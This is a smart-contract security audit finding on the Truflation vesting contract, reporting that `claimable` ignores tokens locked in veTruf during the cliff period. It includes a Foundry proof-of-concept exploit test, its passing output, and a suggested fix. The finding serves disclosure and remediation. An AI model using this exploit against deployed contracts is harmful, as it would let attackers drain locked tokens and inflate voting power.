Sharp Denim Shrimp

high

# Incorrect `claimable` implementation allows users to withdraw locked tokens

## Summary

Vesting gives incorrect accounting during cliff period. This can be leveraged by malicious users to get extra voting tokens.

## Vulnerability Detail

The function `claimable` in `TurfVesting.sol` calculates the pending claimable tokens for the user. A user can also wish to lock up their tokens into the veTruf contract to instead get full access to their voting power even when the actual TRUF tokens are still frozen in the vesting contract.

However, during the cliff period, the code has an escape condition that returns an incorrect value of claimable tokens. This is because, in this code block, the amount of tokens already locked into the veTruf contract is not accounted for. So users can withdraw their locked tokens, breaking accounting.

https://github.com/sherlock-audit/2023-12-truflation/blob/main/truflation-contracts/src/token/TrufVesting.sol#L176-L182

So if a user locks up all their vesting tokens into the veTruf contract, they are still able to withdraw tokens during the cliff period, which they shouldn't have access to.

This can also be demonstrated in the following POC. Here, Alice gets vested 100 ETH of tokens. She locks them all up, waits until the cliff period, and then is able to withdraw 5 ETH of tokens which she shouldnt have access to.

```solidity
function testCliffAttack() external {
    uint256 categoryId = 2;
    uint256 vestingId = 0;
    uint256 stakeAmount = 100e18;
    uint256 duration = 30 days;
    _setupVestingPlan();
    // Setup Alice account with veting+cliff
    vm.startPrank(owner);
    vesting.setUserVesting(categoryId, vestingId, alice, 0, 100e18);
    vm.stopPrank();

    vm.warp(block.timestamp + 15 days);

    // Check claimable
    uint256 claimable = vesting.claimable(categoryId, vestingId, alice);
    emit log_named_uint("Total vesting ", 100e18);
    emit log_named_uint("claimable pre ", claimable);

    // Stake
    vm.startPrank(alice);
    vesting.stake(categoryId, vestingId, stakeAmount, duration);
    claimable = vesting.claimable(categoryId, vestingId, alice);
    vesting.claim(alice, categoryId, vestingId, claimable);
    emit log_named_uint("claimable post", claimable);
    vm.stopPrank();
}
```

Output:

```bash
Running 1 test for test/token/TrufVesting.t.sol:TrufVestingTest
[PASS] testCliffAttack() (gas: 1244664)
Logs:
  Total vesting : 100000000000000000000
  claimable pre : 5000000000000000000
  claimable post: 5000000000000000000
```

We see her claimable didn't change even after locking in tokens, and the `claim` call passes.

## Impact

This gives users access to tokens that should be locked. Users can then lock the tokens they received back into the veTruf contract to get even more voting power. Also, since the vesting contract is paying out tokens to the malicious user which are actually in the veTruf contract, this creates a temporary illiquid state in the vesting contract, preventing unlocked users from withdrawing their tokens. Also, malicious users can use this as a way to bypass the locking period in veTruf tokens.

For all these reasons this issue is a high severity issue.

## Code Snippet

https://github.com/sherlock-audit/2023-12-truflation/blob/main/truflation-contracts/src/token/TrufVesting.sol#L176-L182

## Tool used

Foundry

## Recommendation

Check against the amount of locked tokens during cliff period as well.

```solidity
return initialRelease - userVesting.locked;
```
